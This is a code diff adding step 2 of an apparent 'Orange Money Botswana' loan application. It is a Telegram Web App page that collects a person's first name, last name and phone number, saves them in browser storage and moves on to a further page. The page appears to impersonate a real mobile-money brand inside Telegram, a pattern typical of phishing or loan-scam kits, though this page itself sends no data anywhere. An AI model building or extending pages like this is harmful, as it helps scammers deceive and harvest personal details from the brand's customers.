@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Loan Application Step 2</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: #000000;
+            padding: 15px 20px;
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-sizing: border-box;
+            position: relative;
+            border-bottom: 4px solid #FF6600;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .header-title .orange { color: #FF6600; }
+        .header-title .money { color: #ffffff; margin-left: 5px; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 92%;
+            max-width: 450px;
+            margin: 20px 0;
+            padding: 25px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 22px;
+            color: #000000;
+            margin: 0 0 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: #FF6600;
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 16px;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background-color: #fcfcfc;
+            color: #333;
+            box-sizing: border-box;
+            outline: none;
+            width: 100%;
+        }
+
+        .form-control:focus {
+            border-color: #FF6600;
+        }
+
+        /* Phone Input Layout with Country Code */
+        .phone-container {
+            display: flex;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            overflow: hidden;
+            background-color: #fcfcfc;
+        }
+
+        .phone-container:focus-within {
+            border-color: #FF6600;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0 12px;
+            background-color: #eeeeee;
+            border-right: 1px solid #ccc;
+            font-size: 15px;
+            font-weight: bold;
+            color: #333;
+            user-select: none;
+        }
+
+        .flag-emoji {
+            font-size: 18px;
+        }
+
+        .phone-input {
+            border: none;
+            flex: 1;
+            padding: 12px 15px;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+        }
+
+        .help-text {
+            font-size: 11px;
+            color: #777;
+            margin-top: 6px;
+            line-height: 1.3;
+        }
+
+        /* Dual Action Button Footer */
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .btn-prev {
+            flex: 1;
+            background-color: #e5e5e5;
+            color: #333;
+            border: 1px solid #ccc;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .btn-prev:active {
+            background-color: #d6d6d6;
+        }
+
+        .btn-next {
+            flex: 1;
+            background-color: #FF6600;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-next:hover {
+            background-color: #e55c00;
+        }
+
+        .btn-next:active {
+            opacity: 0.9;
+        }
+
+        /* Footer Copyright */
+        .footer-banner {
+            width: 100%;
+            background-color: #000000;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            margin-top: auto;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a href="/page2" class="back-btn">← Back</a>
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+    <span class="menu-icon">☰</span>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Loan Application</h1>
+    <div class="subtext">Step 2 of 3</div>
+
+    <!-- Step Bar Progress Indicators -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Step 2 Form -->
+    <form id="detailsForm" onsubmit="submitStep2(event)">
+        <div class="form-group">
+            <label for="firstName">First Name</label>
+            <input type="text" id="firstName" class="form-control" placeholder="First name" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">Last Name</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Last name" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Phone Number</label>
+            <div class="phone-container">
+                <div class="country-prefix">
+                    <span class="flag-emoji">🇧🇼</span>
+                    <span>+267</span>
+                </div>
+                <input type="tel" id="phone" class="phone-input" placeholder="71234567 or 071234567" required>
+            </div>
+            <div class="help-text">
+                Enter 8 digits or start with 0 (example, 071234567 → changes to 71234567)
+            </div>
+        </div>
+
+        <!-- Button Layout -->
+        <div class="button-group">
+            <button type="button" class="btn-prev" onclick="goBack()">Previous</button>
+            <button type="submit" class="btn-next">Next Step</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 Orange Money Botswana
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Restore form data if user returns
+        const storedFirstName = localStorage.getItem('firstName');
+        const storedLastName = localStorage.getItem('lastName');
+        const storedPhone = localStorage.getItem('phone');
+
+        if (storedFirstName) document.getElementById('firstName').value = storedFirstName;
+        if (storedLastName) document.getElementById('lastName').value = storedLastName;
+        if (storedPhone) document.getElementById('phone').value = storedPhone;
+    };
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+
+    function submitStep2(event) {
+        event.preventDefault();
+
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
+        let phoneVal = document.getElementById('phone').value.trim();
+
+        // Process leading zero formatting
+        if (phoneVal.startsWith('0')) {
+            phoneVal = phoneVal.substring(1);
+        }
+
+        // Strip non-numeric input digits
+        phoneVal = phoneVal.replace(/\D/g, '');
+
+        if (phoneVal.length < 8) {
+            alert('Please enter a valid Botswana phone number (8 digits).');
+            return;
+        }
+
+        // Save progress information
+        localStorage.setItem('firstName', firstName);
+        localStorage.setItem('lastName', lastName);
+        localStorage.setItem('phone', phoneVal);
+
+        // Advance to Step 3
+        window.location.href = "/page4";
+    }
+</script>
+
+</body>
+</html>
